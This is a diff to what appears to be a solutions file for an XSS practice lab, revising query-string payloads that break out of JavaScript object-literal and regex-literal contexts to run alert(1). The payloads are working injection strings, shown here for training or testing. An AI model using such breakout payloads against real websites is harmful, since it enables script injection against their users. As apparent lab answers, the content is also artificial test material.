@@ -11,10 +11,10 @@ Reflection in various JS literal contexts (string, object key, comment, regex, t
 
 ### timing-level2
 
-`/timing/level2/?query=x;alert(1);y`
+`/timing/level2/?query=x:1%7D%3Balert(1)%3B//`
 
-- payload: `x;alert(1);y`
-- context: inside `var obj = {KEY: "value"}` — inject statements between
+- payload: `x:1};alert(1);//`
+- context: inside an object literal; finish a key, close the object, then run
 
 ### timing-level3
 
@@ -25,10 +25,10 @@ Reflection in various JS literal contexts (string, object key, comment, regex, t
 
 ### timing-level4
 
-`/timing/level4/?query=/;alert(1)//`
+`/timing/level4/?query=x/%3Balert(1)//`
 
-- payload: `/;alert(1)//`
-- context: inside `var re = /.../` — close regex, run, comment
+- payload: `x/;alert(1)//`
+- context: inside `var re = /.../`; close the regex with content first
 
 ### timing-level5
 
